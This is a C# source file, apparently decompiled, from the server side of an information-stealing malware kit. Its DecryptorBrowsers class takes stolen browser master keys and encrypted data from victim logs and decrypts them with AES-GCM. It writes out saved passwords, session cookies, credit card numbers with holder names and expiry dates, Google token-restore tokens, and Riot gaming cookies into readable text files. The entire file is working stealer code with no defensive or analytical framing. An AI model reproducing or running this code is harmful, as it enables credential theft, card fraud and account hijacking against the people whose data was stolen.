using System;
using System.IO;
using System.Text;
using Leb128;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Server.Messages
{
	// Token: 0x02000049 RID: 73
	internal class DecryptorBrowsers
	{
		// Token: 0x060001C3 RID: 451 RVA: 0x0001C8E4 File Offset: 0x0001AAE4
		public static void Start(string log)
		{
			if (Directory.Exists(Path.Combine(log, "Browsers")))
			{
				foreach (string text in Directory.GetDirectories(Path.Combine(log, "Browsers")))
				{
					string path = Path.Combine(text, "MasterKey.bin");
					if (File.Exists(path))
					{
						byte[] key = File.ReadAllBytes(path);
						foreach (string profile in Directory.GetDirectories(text))
						{
							DecryptorBrowsers.DecryptPassword(profile, key);
							DecryptorBrowsers.DecryptCookie(profile, key);
							DecryptorBrowsers.DecryptCreditCard(profile, key);
							DecryptorBrowsers.DecryptTokenRestore(profile, key);
						}
						File.Delete(path);
					}
				}
			}
			if (Directory.Exists(Path.Combine(log, "Gaming", "Riot")))
			{
				string path2 = Path.Combine(log, "Gaming", "Riot", "MasterKey.bin");
				if (!File.Exists(path2))
				{
					return;
				}
				byte[] key2 = File.ReadAllBytes(path2);
				DecryptorBrowsers.DecryptCookie(Path.Combine(log, "Gaming", "Riot"), key2);
			}
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0001C9E4 File Offset: 0x0001ABE4
		public static void DecryptPassword(string profile, byte[] key)
		{
			string path = Path.Combine(profile, "EncryptPassword.bin");
			if (!File.Exists(path))
			{
				return;
			}
			foreach (object obj in LEB128.Read(File.ReadAllBytes(path)))
			{
				try
				{
					object[] array2 = (object[])obj;
					if (!string.IsNullOrEmpty((string)array2[0]) && !string.IsNullOrEmpty((string)array2[1]))
					{
						string @string = Encoding.UTF8.GetString(DecryptorBrowsers.DecryptValue((byte[])array2[2], key));
						File.AppendAllText(Path.Combine(profile, "Password.txt"), string.Concat(new string[]
						{
							"Host: ",
							(string)array2[0],
							"\nUsername: ",
							(string)array2[1],
							"\nPassword: ",
							@string,
							"\n\n"
						}));
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
			File.Delete(path);
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0001CAF0 File Offset: 0x0001ACF0
		public static void DecryptCookie(string profile, byte[] key)
		{
			string path = Path.Combine(profile, "EncryptCookie.bin");
			if (!File.Exists(path))
			{
				return;
			}
			foreach (object obj in LEB128.Read(File.ReadAllBytes(path)))
			{
				try
				{
					object[] array2 = (object[])obj;
					string @string = Encoding.UTF8.GetString(DecryptorBrowsers.DecryptValue((byte[])array2[4], key));
					File.AppendAllText(Path.Combine(profile, "Cookie.txt"), string.Concat(new string[]
					{
						(string)array2[0],
						"\tTRUE\t",
						(string)array2[1],
						"\tFALSE\t",
						(string)array2[2],
						"\t",
						(string)array2[3],
						"\t",
						@string,
						"\r\n"
					}));
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
			File.Delete(path);
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x0001CBF8 File Offset: 0x0001ADF8
		public static void DecryptCreditCard(string profile, byte[] key)
		{
			string path = Path.Combine(profile, "EncryptCreditCard.bin");
			if (!File.Exists(path))
			{
				return;
			}
			foreach (object obj in LEB128.Read(File.ReadAllBytes(path)))
			{
				try
				{
					object[] array2 = (object[])obj;
					string @string = Encoding.UTF8.GetString(DecryptorBrowsers.DecryptValue((byte[])array2[0], key));
					File.AppendAllText(Path.Combine(profile, "CreditCard.txt"), string.Concat(new string[]
					{
						"Number: ",
						@string,
						"\nExp: ",
						(string)array2[1],
						"/",
						(string)array2[2],
						"\nHolder: ",
						(string)array2[3],
						"\n\n"
					}));
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
			File.Delete(path);
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x0001CCF4 File Offset: 0x0001AEF4
		public static void DecryptTokenRestore(string profile, byte[] key)
		{
			string path = Path.Combine(profile, "EncryptTokenRestore.bin");
			if (!File.Exists(path))
			{
				return;
			}
			foreach (object obj in LEB128.Read(File.ReadAllBytes(path)))
			{
				try
				{
					object[] array2 = (object[])obj;
					string @string = Encoding.UTF8.GetString(DecryptorBrowsers.DecryptValue((byte[])array2[1], key));
					File.AppendAllText(Path.Combine(profile, "TokenRestore.txt"), string.Concat(new string[]
					{
						"AccountId: ",
						(string)array2[0],
						"\nToken: ",
						@string,
						"\n\n"
					}));
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
			File.Delete(path);
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x0001CDC4 File Offset: 0x0001AFC4
		public static byte[] DecryptValue(byte[] encryptedData, byte[] bMasterKey)
		{
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			BinaryReader binaryReader = new BinaryReader(new MemoryStream(encryptedData));
			binaryReader.ReadBytes(3);
			byte[] nonce = binaryReader.ReadBytes(12);
			AeadParameters parameters = new AeadParameters(new KeyParameter(bMasterKey), 128, nonce);
			gcmBlockCipher.Init(false, parameters);
			byte[] array = binaryReader.ReadBytes(encryptedData.Length);
			byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
			int outOff = gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0);
			gcmBlockCipher.DoFinal(array2, outOff);
			return array2;
		}

		// Token: 0x0400014F RID: 335
		private const int macBitSize = 128;

		// Token: 0x04000150 RID: 336
		private const int nonceBitSize = 96;
	}
}
